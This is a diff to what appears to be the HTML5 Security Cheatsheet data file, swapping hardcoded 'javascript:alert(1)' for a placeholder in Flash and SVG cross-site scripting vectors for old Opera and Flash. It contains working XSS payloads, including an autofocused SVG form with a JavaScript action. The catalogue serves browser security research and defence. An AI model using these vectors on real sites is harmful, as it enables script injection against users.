@@ -2814,7 +2814,7 @@ var items =
             'crossdomain'    : '1',            
             'path'          : 'http://html5sec.org/test.swf',
             'name'          : 'test.swf',
-            'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"javascript:alert(1);"),flash.Lib._root.name||"_top");\r\n}}'
+            'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"%js_uri_alert%"),flash.Lib._root.name||"_top");\r\n}}'
         },        
         'urls'    : ['http://www.w3.org/TR/REC-html40/struct/objects.html'],
         'howtofix'   : {
@@ -3177,13 +3177,13 @@ var items =
             'cs' : 'SVG obrázky obsahující XML data - s vypnutým JavaScriptem',
             'de' : ''
         },
-        'data'       : '<!-- Up to Opera 10.63 -->\r\n<div style=content:url(%svg_path_2%)></div>\r\n\r\n<!-- Up to Opera 11.61 - see link below -->\r\n\r\n<!-- Up to Opera 12.x -->\r\n<div style="background:url(%svg_path_3%)"></div>',
+        'data'       : '<!-- Up to Opera 10.63 -->\r\n<div style=content:url(%svg_path_2%)></div>\r\n\r\n<!-- Up to Opera 11.61 - see link below -->\r\n\r\n<!-- Up to Opera 12.x -->\r\n<div style="background:url(%svg_path_3%)">PRESS ENTER</div>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
             'crossdomain'    : '0',            
             'path'          : 'http://html5sec.org/test5.svg',
             'name'          : 'test5.svg',
-            'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="javascript:alert(1)">\r\n<!--  this file can be crossdomain if "action" attribute refers to an external file -->\r\n<meta http-equiv="refresh" content="1;URL=%svg_path_3%"/>\r\n<input type="submit" autofocus="autofocus"/>\r\n</form>'
+            'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%">\r\n<!--  this file can be crossdomain if "action" attribute refers to an external file -->\r\n<meta http-equiv="refresh" content="1;URL=%svg_path_3%"/>\r\n<input type="submit" autofocus="autofocus"/>\r\n</form>'
         },
         'description': {
             'en' : 'Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example for Opera 10.x shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. Example for Opera 12.x shows one of the problems (along with a client side DoS, running the "onblur" event, etc), which is generated because of the possibility to steal a focus via embeded SVG image.  The same works of course for SVG files embedded via <IMG> tags.',
